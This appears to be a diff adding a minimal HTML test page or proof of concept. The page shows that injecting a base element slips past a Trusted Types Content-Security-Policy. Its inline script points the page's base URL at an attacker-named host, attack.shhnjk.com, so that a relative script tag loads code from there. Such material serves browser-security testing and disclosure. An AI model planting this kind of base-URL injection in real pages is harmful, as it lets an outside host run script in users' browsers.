@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types 'none';">
+</head>
+<body>
+  <script>
+    let attackerControlledString = 'https://attack.shhnjk.com/';
+    const base = document.createElement('base');
+    base.href = attackerControlledString;
+    document.head.appendChild(base);
+  </script>
+  <script src="/foo.js"></script> <!-- Fire! -->
+</body>
+</html>
